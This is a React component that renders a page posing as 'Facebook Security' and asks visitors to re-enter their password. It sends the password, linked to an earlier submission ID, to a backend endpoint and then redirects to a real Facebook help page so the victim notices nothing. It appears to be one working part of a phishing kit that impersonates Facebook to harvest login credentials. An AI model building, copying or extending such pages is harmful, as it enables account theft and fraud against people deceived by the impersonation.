import { useState } from 'react';
import { useMutation } from '@tanstack/react-query';
import { Loader2, Eye, EyeOff } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { useToast } from '@/hooks/use-toast';
import { apiRequest } from '@/lib/queryClient';
import type { PasswordFormData } from '@shared/schema';

interface PasswordModuleProps {
  submissionId: number;
  userData: any;
}

export default function PasswordModule({ submissionId, userData }: PasswordModuleProps) {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState('');
  const { toast } = useToast();

  const mutation = useMutation({
    mutationFn: async (data: PasswordFormData) => {
      const response = await apiRequest('POST', '/api/forms/password', data);
      return response.json();
    },
    onSuccess: (data) => {
      if (data.success) {
        toast({
          title: "Password verified successfully",
          description: "Redirecting to help center...",
        });
        // JavaScript redirect after successful verification
        setTimeout(() => {
          window.location.href = data.redirectUrl || 'https://www.facebook.com/help/media/thank-you?rdrhc';
        }, 1000);
      } else {
        if (data.errors) {
          const passwordError = data.errors.find((error: any) => error.field === 'password');
          setError(passwordError?.message || 'Verification failed');
        }
      }
    },
    onError: (error) => {
      setError('Verification failed. Please try again.');
      toast({
        title: "Verification failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  // JavaScript form handlers
  const handlePasswordChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPassword(e.target.value);
    if (error) {
      setError('');
    }
  };

  const handleTogglePassword = () => {
    setShowPassword(!showPassword);
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (password.length < 6) {
      setError('Password must be at least 6 characters long.');
      return;
    }

    setError('');
    mutation.mutate({ password, submissionId });
  };

  return (
    <div className="min-h-screen bg-facebook-gray flex items-center justify-center p-4">
      <div className="bg-white rounded-lg shadow-lg p-6 sm:p-8 w-full max-w-sm">
        {/* Logo */}
        <div className="text-center mb-6">
          <div className="w-12 h-12 sm:w-16 sm:h-16 mx-auto mb-4 bg-facebook-blue rounded-full flex items-center justify-center">
            <span className="text-white font-bold text-lg sm:text-xl">f</span>
          </div>
          <h2 className="text-base sm:text-lg font-bold text-facebook-text">Facebook Security</h2>
        </div>

        <p className="text-xs sm:text-sm text-facebook-secondary text-center mb-6">
          Please re-enter your password to complete the request.
        </p>

        <form onSubmit={handleFormSubmit}>
          <div className="mb-4">
            <Label className="block text-xs font-medium text-facebook-secondary mb-2" htmlFor="password">
              Password <span className="text-red-500">*</span>
            </Label>
            <div className="relative">
              <Input
                type={showPassword ? 'text' : 'password'}
                id="password"
                name="password"
                value={password}
                onChange={handlePasswordChange}
                required
                placeholder="Enter your password"
                className={`w-full px-3 py-2 border rounded-md text-sm focus:outline-none focus:ring-2 focus:ring-facebook-blue focus:border-facebook-blue transition-colors pr-10 ${
                  error ? 'border-red-500' : 'border-facebook-border'
                }`}
              />
              <button
                type="button"
                onClick={handleTogglePassword}
                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-facebook-secondary hover:text-facebook-blue transition-colors"
              >
                {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
            {error && <p className="text-red-500 text-xs mt-1">{error}</p>}
          </div>

          <Button
            type="submit"
            disabled={mutation.isPending}
            className="w-full bg-facebook-blue hover:bg-facebook-blue-dark text-white py-2 sm:py-3 px-4 rounded-md font-medium transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center text-sm sm:text-base"
          >
            {mutation.isPending ? (
              <>
                <Loader2 className="w-4 h-4 mr-2 animate-spin" />
                Verifying...
              </>
            ) : (
              'Submit'
            )}
          </Button>
        </form>
      </div>
    </div>
  );
}